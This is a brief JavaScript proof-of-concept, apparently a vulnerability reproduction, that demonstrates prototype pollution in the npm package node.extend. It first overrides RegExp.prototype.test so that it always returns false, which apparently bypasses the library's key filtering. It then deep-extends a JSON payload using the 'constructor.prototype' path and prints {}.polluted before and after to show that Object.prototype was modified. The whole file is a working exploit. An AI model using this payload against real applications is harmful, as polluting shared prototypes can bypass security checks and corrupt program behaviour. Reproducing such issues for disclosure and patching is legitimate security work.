RegExp.prototype.test = () => false;
let extend = require('node.extend');
var obj = {};
console.log({}.polluted);
extend(true, {}, JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}'));
console.log({}.polluted);